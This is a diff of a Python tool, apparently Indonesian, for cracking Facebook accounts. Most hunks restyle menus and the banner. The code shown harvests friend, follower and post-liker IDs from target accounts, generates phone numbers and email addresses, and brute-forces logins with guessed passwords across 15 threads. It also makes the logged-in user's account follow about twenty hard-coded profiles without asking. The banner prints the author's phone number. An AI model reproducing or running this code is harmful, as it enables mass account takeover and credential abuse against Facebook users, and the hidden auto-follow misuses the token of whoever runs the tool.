@@ -33,17 +33,17 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;93m ______   _______   _____         __    __   ____    ______ \x1b[0;97mBy Aang-XD
-\x1b[0;93m|____  | |  ___  | |  _  |       |  \  /  | |  _ \  |  ____| \x1b[0;97mYt  : Aang-XD
-\x1b[0;93m  ____| | | |   | | | |_| |       |   \/   | | |_\ \ | |____ \x1b[0;97mFb1 : Saya Aang
-\x1b[0;93m|  __  | | |   | | |___  |       | |\  /| | |  _  | |  ____| \x1b[0;97mFb2 : Why Aang Ardiansyah
-\x1b[0;93m| |__| | | |   | |  ___| |  ___  | | \/ | | | |_/ / | | \x1b[0;97mWa  : 089524163441
-\x1b[0;93m|______| |_|   |_| |_____| |___| |_|    |_| |____/  |_| \x1b[0;97m versi 1.9
-\x1b[0;37m╔═══════════════════════════════════════════════════╗
-\x1b[0;37m╠═[\x1b[1;93m•\x1b[0;37m]\x1b[0;37m Author   : Aang Ardiansyah-XD                 ║
-\x1b[0;37m╠═[\x1b[1;93m•\x1b[0;37m]\x1b[0;37m Github   : Github.com/AngCyber                ║
-\x1b[0;37m╠═[\x1b[1;93m•\x1b[0;37m]\x1b[0;37m Facebook : Why Aang Ardiansyah                ║
-\x1b[0;37m╚═══════════════════════════════════════════════════╝
+    print("""\x1b[0;93m ______   _______   _____         __    __   ____    ______
+\x1b[0;93m |____  | |  ___  | |  _  |       |  \  /  | |  _ \  |  ____|
+\x1b[0;93m  ____| | | |   | | | |_| |       |   \/   | | |_\ \ | |____
+\x1b[0;93m |  __  | | |   | | |___  |       | |\  /| | |  _  | |  ____|
+\x1b[0;93m | |__| | | |   | |  ___| |  ___  | | \/ | | | |_/ / | |
+\x1b[0;93m |______| |_|   |_| |_____| |___| |_|    |_| |____/  |_|
+\x1b[0;37m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠
+\x1b[0;33m[\x1b[1;97m•\x1b[0;33m]\x1b[0;37m Author   : Aang Ardiansyah-XD
+\x1b[0;33m[\x1b[1;97m•\x1b[0;33m]\x1b[0;37m Github   : Github.com/AngCyber
+\x1b[0;33m[\x1b[1;97m•\x1b[0;33m]\x1b[0;37m Facebook : Saya Aang
+\x1b[0;37m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠
 """)
 host="https://mbasic.facebook.com"
 ok = []
@@ -123,15 +123,15 @@ def gets_dict_cookies(cookies):
 def country():
     os.system("clear")
     banner()
-    print("\n%s╠[%s Please select a country %s]\n"%(k,p,k))
-    print("%s╔═[%s01%s] %sIndonesia [\x1b[1;33mNegara Santuy\x1b[1;37m]"%(k,p,k,p))
-    print("%s╠═[%s02%s] %sIndian"%(k,p,k,p))
-    print("%s╠═[%s03%s] %sPakistan"%(k,p,k,p))
-    print("%s╚═[%s04%s] %sUSA [\x1b[1;33mAmerican\x1b[1;37m]"%(k,p,k,p))
+    print("\n%s[%s Please select a country %s]\n"%(k,p,k))
+    print("%s[%s01%s] %sIndonesia (Warga Bar-Bar)"%(k,p,k,p))
+    print("%s[%s02%s] %sIndian"%(k,p,k,p))
+    print("%s[%s03%s] %sPakistan"%(k,p,k,p))
+    print("%s[%s04%s] %sUSA (American)"%(k,p,k,p))
     choose_country()
     
 def choose_country():
-    cc = input("\n%s╠═[%s•%s] %sChoose : "%(k,p,k,p))
+    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
     if cc in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
@@ -192,10 +192,10 @@ def choose_country():
 def logs():
   os.system("clear")
   banner()
-  print((k+"\n╔═["+p+"01"+k+"]"+p+" Login With Token"))
-  print((k+"╠═["+p+"02"+k+"]"+p+" Login With Cookies"))
-  print((k+"╚═["+p+"00"+k+"]"+p+" Log Out(Ahh Ngecrot)"))
-  sek=input(k+"\n╠═["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n["+p+"01"+k+"]"+p+" Login With Token"))
+  print((k+"["+p+"02"+k+"]"+p+" Login With Cookies"))
+  print((k+"["+p+"00"+k+"]"+p+" Log Out(Ahh Ngecrot)"))
+  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
   if sek=="":
     print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
@@ -214,7 +214,7 @@ def logs():
 def log_token():
     os.system("clear")
     banner()
-    toket = input(k+"\n╠═["+p+"?"+k+"]"+p+" Token : ")
+    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -222,17 +222,17 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((k+"\n╔═["+p+"✓"+k+"]"+p+" Login Successfully"))
+        print((k+"\n["+p+"✓"+k+"]"+p+" Login Successfully"))
         bot_follow()
     except KeyError:
-        print((k+"╚═["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
+        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
         os.system("clear")
         logs()
 
 def gen():
         os.system("clear")
         banner()
-        cookie = input(k+"\n╠═["+p+"?"+k+"]"+p+" Cookies : ")
+        cookie = input(k+"\n["+p+"?"+k+"]"+p+" Cookies : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                 "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
@@ -252,13 +252,13 @@ def gen():
         except requests.exceptions.ConnectionError:
                 print((k+"["+p+"!"+k+"]"+p+" No Connection"))
         except [KeyError,IOError]:
-            print((k+"╚═["+p+"!"+k+"]"+p+" Cookies Invalid Ngab!!"))
+            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid Ngab!!"))
             os.system("clear")
             logs()
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((k+"\n╔═["+p+"✓"+k+"]"+p+" Login successfully"))
+        print((k+"\n["+p+"✓"+k+"]"+p+" Login successfully"))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -271,9 +271,9 @@ def bot_follow():
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
-		print((k+"\n╚═["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
 		logs()
-	jalan("%s╚═[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
+	jalan("%s[%s+%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
@@ -297,7 +297,7 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moh Yayan
 	menu()
 
-### MENU INI ANJING ###
+### MAIN MENU ###
 
 def menu():
     try:
@@ -312,7 +312,7 @@ def menu():
     ip = requests.get("https://api.ipify.org").text
     ngr = open('country.txt', 'r').read()
     if "id" in ngr:
-        negara = "Indonesia"
+        negara = "Indonesia slur"
     elif "bd" in ngr:
         negara = "Prindapan/India"
     elif "pk" in ngr:
@@ -323,25 +323,25 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    print((k+"\n╠═[ "+p+"Selamat Datang "+a["name"]+k+ Ngentod" ]"+p))
-    print((k+"\n╔═["+p+"•"+k+"]"+p+" Your ID : "+id))
-    print((k+"╠═["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"╠═["+p+"•"+k+"]"+p+" Status  : "+m+"Jomblo/Tidak Laku"+p))
-    print((k+"╠═["+p+"•"+k+"]"+p+" Joined  : "+durasi))
-    print((k+"╚═["+p+"•"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n╔═["+p+"01"+k+"]"+p+" Crack ID From Publik"))
-    print((k+"╠═["+p+"02"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"╠═["+p+"03"+k+"]"+p+" Crack ID From Like Postingan"))
-    print((k+"╠═["+p+"04"+k+"]"+p+" Crack Melalui Nomor Telepon"))
-    print((k+"╠═["+p+"05"+k+"]"+p+" Crack Melalui Email"))
-    print((k+"╠═["+p+"06"+k+"]"+p+" Ambil Data Target"))
-    print((k+"╠═["+p+"07"+k+"]"+p+" Lihat Hasil Crack"))
-    print((k+"╠═["+p+"08"+k+"]"+p+" Setting User Agent"))
-    print((k+"╚═["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
+    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
+    print((k+"\n["+p+"+"+k+"]"+p+" Your ID : "+id))
+    print((k+"["+p+"+"+k+"]"+p+" Your IP : "+ip))
+    print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"J O M B L O"+p))
+    print((k+"["+p+"+"+k+"]"+p+" Joined  : "+durasi))
+    print((k+"["+p+"+"+k+"]"+p+" Crack   : "+negara))
+    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Publik/Followers"))
+    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"))
+    print((k+"["+p+"03"+k+"]"+p+" Crack ID From Like Postingan"))
+    print((k+"["+p+"04"+k+"]"+p+" Crack Melalui Nomor Telepon"))
+    print((k+"["+p+"05"+k+"]"+p+" Crack Melalui Email"))
+    print((k+"["+p+"06"+k+"]"+p+" Ambil Data Target"))
+    print((k+"["+p+"07"+k+"]"+p+" View Results Crack"))
+    print((k+"["+p+"08"+k+"]"+p+" Cek User Agent"))
+    print((k+"["+p+"00"+k+"]"+p+" Log Out (Ahh Ngecrot)"))
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n╠═["+p+"•"+k+"]"+p+"Choose : ")
+	r=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -373,12 +373,12 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n╔═["+p+"01"+k+"]"+p+" Api ("+k+"Sangat Cepat"+p+")"))
-  print((k+"╠═["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Cepat + TTL "+p+")"))
-  print((k+"╠═["+p+"03"+k+"]"+p+" Mbasic ("+k+"Lambat & Rekomendasi"+p+")"))
-  print((k+"╠═["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Lambat + TTL"+p+")"))
-  print((k+"╚═["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Sangat Lambat"+p+")"))
-  krah=input(k+"\n╠═["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n["+p+"01"+k+"]"+p+" Api ("+k+"Fast/Cepat"+p+")"))
+  print((k+"["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Fast + TTL "+p+")"))
+  print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Slow And Recommended"+p+")"))
+  print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Slow + TTL"+p+")"))
+  print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Super Slow/Sangat Lambat"+p+")"))
+  krah=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -402,18 +402,18 @@ def publik():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n╚═["+p+"!"+k+"]"+p+" Cookie/Token Invalid Ngab!!"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		print((k+"\n╔═["+p+"+"+k+"]"+p+" Ketik \'me\' Untuk Mengambil ID Teman"))
-		idt = input(k+"╠═["+p+"?"+k+"]"+p+" ID Target : ")
+		print((k+"\n["+p+"+"+k+"]"+p+" Ketik \'me\' Untuk Mengambil ID Teman"))
+		idt = input(k+"["+p+"?"+k+"]"+p+" ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"╠═["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Name : "+op["name"]))
 		except KeyError:
-			print((k+"╚═["+p+"!"+k+"]"+p+" ID Tidak Ada Ngab"))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod"))
 			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
@@ -425,7 +425,7 @@ def publik():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"╚═["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -434,17 +434,17 @@ def follow():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n╚═["+p+"!"+k+"]"+p+" Cookie/Token Invalid Ngab!!"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n╔═["+p+"?"+k+"]"+p+" Followers ID Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" Followers ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"╠═["+p+"•"+k+"]"+p+" Nama : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
 		except KeyError:
-			print((k+"╚═["+p+"!"+k+"]"+p+" ID Tidak Ada Ngab!!"))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
 			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
@@ -456,7 +456,7 @@ def follow():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"╚═["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -465,17 +465,17 @@ def likers():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((k+"\n╚═["+p+"!"+k+"]"+p+" Cookie/Token Invalid Ngab!!"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n╔═["+p+"?"+k+"]"+p+" ID Postingan Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Postingan Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"╠═["+p+"•"+k+"]"+p+" Nama : "+op["name"]))
+			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
 		except KeyError:
-			print((k+"╚═["+p+"!"+k+"]"+p+" ID Tidak Ada Ngab!!"))
+			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
 			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
@@ -487,7 +487,7 @@ def likers():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"╚═["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -496,14 +496,14 @@ def likers():
 
 def random_numbers():
   data = []
-  print((k+"\n╔═["+p+"•"+k+"]"+p+" Nomor Harus 5 Digit"))
-  print((k+"╠═["+p+"•"+k+"]"+p+" Contoh : 92037"))
-  kode=str(input(k+"╠═["+p+"?"+k+"]"+p+" Masukan Nomor : "))
-  exit((k+"\n╠═["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
-  exit((k+"\n╠═["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
-  jml=int(input(k+"╚═["+p+"?"+k+"]"+p+" Jumlah : "))
+  print((k+"\n["+p+"•"+k+"]"+p+" Nomor Harus 5 Digit"))
+  print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
+  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : "))
+  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
+  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
+  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
-  print(k+"\n╠═["+p+"•"+k+"]"+p+" Crack Berjalan Tunggu Tod...\n")
+  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan Tunggu Tod...\n")
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
@@ -511,17 +511,17 @@ def random_numbers():
 
 def random_email():
   data = []
-  nama=input(k+"\n╔═["+p+"?"+k+"]"+p+" Target Name : ")
-  domain=input(k+"╠═["+p+"?"+k+"]"+p+" Pilih Huruh Depan [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
+  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
+  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
   list={
     'g':'@gmail.com',
     'y':'@yahoo.com',
     'h':'@hotmail.com'
   }
-  exit((k+"╚═["+p+"!"+k+"]"+p+" Isi Yang Benar!!")) if not domain in ['g','y','h'] else ''
-  jml=int(input(k+"╠═["+p+"?"+k+"]"+p+" Jumlah : "))
-  setpw=input(k+"╚═["+p+"?"+k+"]"+p+" Masukan Kata Sandi : ").split(',')
-  print(k+"\n╠═["+p+"•"+k+"]"+p+" Crack Berjalan, Tunggu Tod...\n")
+  exit((k+"["+p+"!"+k+"]"+p+" Isi Yang Benar!!")) if not domain in ['g','y','h'] else ''
+  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
+  setpw=input(k+"["+p+"+"+k+"]"+p+" Masukan Kata Sandi : ").split(',')
+  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan, Tunggu Tod...\n")
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
@@ -562,12 +562,12 @@ def target():
 		os.system("rm -rf login.txt")
 		login()
 	try:
-		idt = input(k+"\n╔═["+p+"?"+k+"]"+p+" ID Target        : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Target        : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"╚═["+p+"+"+k+"]"+p+" Nama Akun       : "+op["name"]))
-			print((k+"╚═["+p+"+"+k+"]"+p+" Username         : "+op["username"]))
+			print((k+"["+p+"+"+k+"]"+p+" Nama Akun     : "+op["name"]))
+			print((k+"["+p+"+"+k+"]"+p+" Username         : "+op["username"]))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
@@ -686,15 +686,15 @@ def defaultua():
         logs()
 
 def menu_user_agent():
-    print("\n%s╔═[%s01%s] %sGet User Agent"%(k,p,k,p))
-    print("%s╠═[%s02%s] %sChange User Agent"%(k,p,k,p))
-    print("%s╠═[%s03%s] %sDelete User Agent"%(k,p,k,p))
-    print("%s╠═[%s04%s] %sCheck User Agent"%(k,p,k,p))
-    print("%s╚═[%s00%s] %sBack/Kembali"%(k,p,k,p))
+    print("\n%s[%s01%s] %sGet User Agent"%(k,p,k,p))
+    print("%s[%s02%s] %sChange User Agent"%(k,p,k,p))
+    print("%s[%s03%s] %sDelete User Agent"%(k,p,k,p))
+    print("%s[%s04%s] %sCheck User Agent"%(k,p,k,p))
+    print("%s[%s00%s] %sBack/Kembali"%(k,p,k,p))
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s╠═[%s•%s] %sChoose : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -774,7 +774,7 @@ def mbasic(em,pas,hosts):
 	else:return {"status":"error","email":em,"pass":pas}
 
 def f_fb(em,pas,hosts):
-	ua = open('ugent.txt', 'r').read()ll
+	ua = open('ugent.txt', 'r').read()
 	r=requests.Session()
 	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	p=r.get("https://free.facebook.com/")
